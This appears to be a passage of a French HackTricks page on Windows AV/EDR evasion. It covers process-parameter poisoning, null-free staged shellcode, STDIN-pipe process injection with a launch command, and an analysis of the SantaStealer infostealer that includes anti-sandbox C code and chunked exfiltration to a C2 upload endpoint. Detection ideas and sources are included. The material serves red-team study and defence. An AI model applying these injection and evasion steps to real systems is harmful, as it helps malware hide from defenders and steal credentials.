NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Exécution du tampon de paramètres copié

La région de paramètres copiée est généralement `RW`, et non exécutable. Une chaîne P3 courante est :

1. Créer le processus normalement (sans le suspendre)
2. Rendre la page de paramètres choisie exécutable avec `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Réutiliser le handle du thread principal déjà renvoyé dans `PROCESS_INFORMATION`
4. Rediriger l’exécution avec `NtSetContextThread` (`CONTEXT_CONTROL`, écraser `RIP`)

Contrairement aux workflows classiques de détournement de thread, cela ne **nécessite pas** `SuspendThread` / `ResumeThread` ; le contexte peut être modifié directement via le handle du thread principal renvoyé.

Cela évite plusieurs API souvent surveillées pour détecter l’injection :

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- souvent aussi `SuspendThread` / `ResumeThread`

### Limitation liée aux octets nuls et shellcode en plusieurs étapes

Les trois vecteurs sont des données de type chaîne ou apparentées ; un payload brut contenant `0x00` est donc tronqué pendant le transfert. Une solution pratique consiste à utiliser un **premier stage sans octets nuls**, qui reconstruit les constantes à l’exécution puis charge un second stage arbitraire.

Un motif simple consiste à synthétiser les constantes à l’aide de XOR :

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Cela permet à la première étape de construire des chaînes sur la pile, des arguments d’API, des chemins de DLL ou un chargeur de shellcode de deuxième étape sans intégrer d’octets nuls au paramètre transmis.

### Appels d’API basés sur la pile depuis la première étape

Lorsque la première étape doit appeler des API telles que `LoadLibraryA`, elle peut :

- pousser la chaîne/le tampon sur la pile de la cible
- réserver les **32 octets d’espace shadow x64**
- définir `RCX`, `RDX`, `R8`, `R9` avec des constantes ou des pointeurs relatifs à `RSP`
- conserver `RSP` **aligné sur 16 octets** avant l’appel

Une deuxième étape peut alors être copiée depuis la pile dans une allocation `PAGE_READWRITE`, passer en `PAGE_EXECUTE_READ` avec `VirtualProtect`, puis être exécutée par saut, évitant ainsi une allocation RWX directe.

### Pistes de détection

Les auteurs mentionnent de bonnes pistes de détection :

- `VirtualProtectEx` / `NtProtectVirtualMemory` qui rendent exécutables des **pages de paramètres de processus**
- ce changement de protection suivi de `SetThreadContext` / `NtSetContextThread`
- des lectures à distance de `PEB`, puis de `RTL_USER_PROCESS_PARAMETERS`
- des valeurs `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` inhabituellement longues ou à entropie élevée lors de la création du processus

### Notes

- P3 est une **technique de transfert interprocessus**, pas une primitive d’exécution complète à elle seule : le paramètre copié nécessite toujours un changement des permissions d’exécution et une méthode de redirection de l’exécution.
- `RtlCreateProcessReflection` / Dirty Vanity a été envisagé par les auteurs, mais écarté parce qu’il fait appel en interne à des primitives suspectes telles que `NtWriteVirtualMemory` et `NtCreateThreadEx`.

## Injection via pipe STDIN de console

Un enfant de console interactif peut également servir de **primitive de transfert du payload**. L’injecteur redirige l’entrée standard de l’enfant vers un pipe et envoie un marqueur suivi du shellcode. Une fois les données lues par le programme de console dans sa propre mémoire privée, l’injecteur trouve ce tampon, le rend exécutable et y redirige un thread enfant. Cela évite `VirtualAllocEx` et `WriteProcessMemory`, mais il s’agit toujours d’une injection de processus, et non d’un contournement EDR général.<sup>[[41]](#references)</sup>

Malgré la description de « named pipe », l’implémentation de référence appelle `CreatePipe`, qui crée un **pipe anonyme**. Windows implémente les pipes anonymes au moyen d’objets pipe dotés de noms uniques en interne, mais le PoC ne choisit pas de chemin `\\.\pipe\<name>` et n’appelle pas `CreateNamedPipe`. Il crée des handles héritables avec un descripteur de sécurité par défaut, place le handle de lecture dans `STARTUPINFO.hStdInput`, définit `STARTF_USESTDHANDLES` et lance un nouvel enfant avec l’héritage des handles activé. Ce PoC lance donc l’exécutable de console fourni ; il ne rattache pas son pipe à un processus existant.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Déroulement de référence

L’implémentation utilise la chaîne suivante :<sup>[[41]](#references)</sup>

1. Créer des paires de pipes anonymes pour le `STDIN` et le `STDOUT` de l’enfant. Désactiver l’héritage sur les deux handles côté parent et fermer, dans le parent, les doublons des handles côté enfant après la création du processus.
2. Lancer un exécutable interactif tel que `netsh.exe` ou `nslookup.exe` avec `CREATE_NEW_CONSOLE`. L’enfant hérite des handles standard redirigés.
3. Envoyer l’intégralité du tableau binaire `rawData` avec `WriteFile` via le handle `STDIN` côté parent. Le programme de console consomme les octets et en laisse une copie dans l’une de ses régions privées validées.
4. Parcourir l’espace d’adressage de l’enfant avec `VirtualQueryEx`, lire les régions candidates `MEM_PRIVATE` avec `ReadProcessMemory` et rechercher le marqueur au début de `rawData`.
5. Passer le tampon découvert en `PAGE_EXECUTE_READWRITE` avec `VirtualProtectEx`.
6. Identifier le thread principal, le suspendre, définir `RIP` sur `found_address + 0x19` avec `NtSetContextThread`, puis le reprendre.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L’implémentation fournie est spécifique à x64 : elle modifie `CONTEXT.Rip`, et son payload intégré est du shellcode x64. `rawData` commence par un marqueur de 25 octets ; les octets exécutables commencent donc à l’offset hexadécimal `0x19`. Lors du remplacement du payload, conservez cette disposition ou mettez à jour simultanément le marqueur, le vecteur de recherche, la taille du tableau et l’offset d’exécution. Les commentaires du code source indiquent également `0x0A`, `0x0D` et `0x1A` comme caractères interdits. Ce workflow ne modifie ni le token ni les privilèges du processus enfant.<sup>[[41]](#references)</sup>

Pour de petits helpers natifs et des modèles de compilation de payloads, consultez [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Techniques de SantaStealer pour l’évasion sans fichier et le vol d’identifiants

SantaStealer (alias BluelineStealer) illustre comment les info-stealers modernes combinent le contournement de l’AV, l’anti-analyse et l’accès aux identifiants dans un même workflow.<sup>[[24]](#references)</sup>

### Filtrage selon la disposition du clavier et délai en sandbox

- Un indicateur de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est détectée, l’échantillon crée un marqueur `CIS` vide et se termine avant de lancer les stealers, ce qui garantit qu’il ne s’exécute jamais dans les régions exclues tout en laissant une trace utile à la chasse aux menaces.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logique `check_antivm` à plusieurs couches

- La variante A parcourt la liste des processus, hache chaque nom à l’aide d’une somme de contrôle cumulative personnalisée, puis compare le résultat à des blocklists intégrées de debuggers/sandboxes ; elle applique aussi la somme de contrôle au nom de l’ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- La variante B inspecte les propriétés du système (seuil minimal du nombre de processus, temps de fonctionnement récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox et effectue des vérifications temporelles autour de pauses pour repérer le single-stepping. Toute détection interrompt l’exécution avant le lancement des modules.

### Helper fileless + chargement réflexif avec double ChaCha20

- La DLL/EXE principale intègre un helper d’identifiants Chromium, qui est soit déposé sur le disque, soit mappé manuellement en mémoire ; en mode fileless, il résout lui-même les imports/relocations, de sorte qu’aucun artefact du helper n’est écrit sur le disque.
- Ce helper stocke une DLL de deuxième étape chiffrée deux fois avec ChaCha20 (deux clés de 32 octets et deux nonces de 12 octets). Après les deux passes, il charge le blob par réflexion (sans `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Les routines ChromElevator utilisent le reflective process hollowing par direct syscall pour s’injecter dans un navigateur Chromium actif, hériter des clés AppBound Encryption et déchiffrer les mots de passe/cookies/cartes bancaires directement depuis les bases de données SQLite, malgré le renforcement d’ABE.


### Collecte modulaire en mémoire et exfiltration HTTP par blocs

- `create_memory_based_log` parcourt une table globale de pointeurs de fonction `memory_generators` et lance un thread par module activé (Telegram, Discord, Steam, captures d’écran, documents, extensions de navigateur, etc.). Chaque thread écrit les résultats dans des tampons partagés et indique le nombre de fichiers après une fenêtre de join d’environ 45 s.
- Une fois l’opération terminée, tout est compressé avec la bibliothèque `miniz` liée statiquement dans `%TEMP%\\Log.zip`. `ThreadPayload1` attend ensuite 15 s, puis transmet l’archive par HTTP POST en blocs de 10 MB à `http://<C2>:6767/upload`, en usurpant une boundary `multipart/form-data` de navigateur (`----WebKitFormBoundary***`). Chaque bloc ajoute `User-Agent: upload`, `auth: <build_id>`, et éventuellement `w: <campaign_tag>` ; le dernier bloc ajoute `complete: true` pour indiquer au C2 que le réassemblage est terminé.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)

{{#include ../banners/hacktricks-training.md}}
